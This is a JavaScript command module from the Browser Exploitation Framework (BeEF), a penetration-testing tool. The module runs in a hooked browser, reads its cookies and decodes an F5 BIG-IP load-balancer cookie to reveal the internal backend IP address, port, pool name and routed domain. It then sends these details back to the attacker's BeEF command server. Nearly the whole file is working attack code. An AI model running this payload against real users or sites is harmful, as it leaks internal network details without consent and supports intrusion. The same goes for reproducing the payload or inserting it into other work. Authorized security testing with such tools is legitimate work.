//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var poolName = 'unknown';
  var routedDomain = 'unknown';
  var BIGipCookieName = '';
  var BIGipCookieValue = '';
  var backend = '';
  var result = '';

  function f5CookieDecode(cookieValue){
    var host;
    var port;

    if (cookieValue.match(/(\d{8,10})\.(\d{1,5})\./) !== null) {
      host = cookieValue.split('.')[0];
      host = parseInt(host);
      host = '' + (host & 0xFF) + '.' +
        ((host >> 8) & 0xFF) + '.' +
        ((host >> 16) & 0xFF) + '.' +
        ((host >> 24) & 0xFF);
      port = cookieValue.split('.')[1];
      port = parseInt(port);
      port = '' + (((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
    } else if (cookieValue.match(/rd\d+o0{20}f{4}([a-f0-9]{8})o(\d{1,5})/) !== null) {
      host = cookieValue.split('ffff')[1].split('o')[0];
      host = parseInt(host.slice(0,2), 16) + '.' +
        parseInt(host.slice(2, 4), 16) + '.' +
        parseInt(host.slice(4, 6), 16) + '.' +
        parseInt(host.slice(6, 8), 16);
      port = cookieValue.split('ffff')[1].split('o')[1];
      port = parseInt(port).toString(16);
      port = parseInt(port.slice(2, 4) + port.slice(0, 2), 16);
    } else if (cookieValue.match(/vi([a-f0-9]{32})\.(\d{1,5})/) !== null) {
      host = cookieValue.split('.')[0].slice(2, -1);
      var decoded_host = '';
      for (var i = 0; i <  host.length; i += 4) {
        decoded_host += host.slice(i, i + 4) + ':';
      }
      host = decoded_host;
      port = cookieValue.split('.')[1];
      port = parseInt(port);
      port = '' + ( ((port & 0xFF) << 8) | ((port >> 8) & 0xFF) );
    } else if (cookieValue.match(/rd\d+o([a-f0-9]{32})o(\d{1,5})/) !== null) {
        host = cookieValue.split('o')[1];
        var decoded_host = '';
        for (var i = 0; i <  host.length; i += 4){
          decoded_host += host.slice(i,i+4) + ':';
        }
        host = decoded_host;
        port = cookieValue.split('o')[2];
    }

    return {
            host: host,
            port: port
    }
  }

  var m = document.cookie.match(/([~_\.\-\w\d]+)=(((?:\d+\.){2}\d+)|(rd\d+o0{20}f{4}\w+o\d{1,5})|(vi([a-f0-9]{32})\.(\d{1,5}))|(rd\d+o([a-f0-9]{32})o(\d{1,5})))(?:$|,|;|\s)/);

  if (m !== null) {
    BIGipCookieName = m[0].split('=')[0];
    BIGipCookieValue = m[0].split('=')[1];
    result = 'BigIP_cookie_name=' + BIGipCookieName;

    // Retreive pool name via cookie name
    if (BIGipCookieName.match(/^BIGipServer/) !== null) {
      poolName = BIGipCookieName.split('BIGipServer')[1];
      result += '&pool_name=' + poolName;
    }

    // Routed domain is used
    if (BIGipCookieValue.match(/^rd/) !== null) {
      routedDomain = BIGipCookieValue.split('rd')[1].split('o')[0];
      result += '&routed_domain=' + routedDomain;
    }

    backend = f5CookieDecode(BIGipCookieValue);
    result += '&host=' + backend.host + '&port=' + backend.port;
  }
  else result = 'result=BigIP coookie not found'
  beef.net.send('<%= @command_url %>', <%= @command_id %>, result);
});
